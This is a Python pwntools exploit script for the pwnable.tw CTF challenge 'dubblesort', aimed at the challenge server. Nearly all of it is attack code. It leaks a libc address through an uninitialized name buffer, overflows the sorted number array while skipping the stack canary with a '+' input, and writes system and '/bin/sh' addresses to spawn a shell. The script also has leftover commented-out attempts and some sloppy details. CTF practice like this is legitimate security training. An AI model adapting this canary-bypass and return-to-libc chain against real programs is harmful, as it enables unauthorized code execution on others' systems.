#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('dubblesort_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)
rl = lambda data, proc=None: proc.recvline(data) if proc else p.recvline(data)
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+237
        # b*0x565559be
        b*main+210
        b*main+57
        b*main+310
        # b*0x56555974
        b*execve
        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10101
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10101)
else:
    p = process([exe.path])
GDB()
# start of num: 0xffffcdcc
sa(b'What your name :', b'a'*0x10)

ru(b'a'*0x10)

libc_leak = u32(r(4))
libc.address = libc_leak -0x8f82f
info(f'libc leak: {hex(libc_leak)}')
info(f'libc bae: {hex(libc.address)}')
# system(b'/bin/sh')

main_loop = 0x185c3 + libc.address
pop_rdi = 0x00000a68 + libc.address

slna(b'do you what to sort :', 35)

for i in range(24):
    slna(b'number : ', 0)

sla(b'number : ', b'+')

pad_1 = 0x1b0480 + libc.address
pad_null = 0x1b0030 + libc.address
one = 0x5f065 + libc.address
for i in range(7):
    slna(b'number : ', libc.address)

slna(b'number : ', libc.sym.system) # 33
# slna(b'number : ', libc.sym.system) # 33
slna(b'number : ', next(libc.search(b'/bin/sh')))
slna(b'number : ', next(libc.search(b'/bin/sh')))

# slna(b'number : ', pad_1)
# slna(b'number : ', pad_1)
# slna(b'number : ', next(libc.search(b'/bin/sh')))

# for i in range(38):
#     slna(b'number : ', pad_1)


# slna(b'number : ', 0)

# slna(b'number : ', 0)



# # target saved rip: 0x2a8305ec --> inf loop

# slna(b'number : ', 0xff)
# slna(b'number : ', 0xbe)


# #  for i in range(31):
# #     slna(b"number : ", 0xff)
# # slna(b"number : ", 0xacffffffff)


p.interactive()
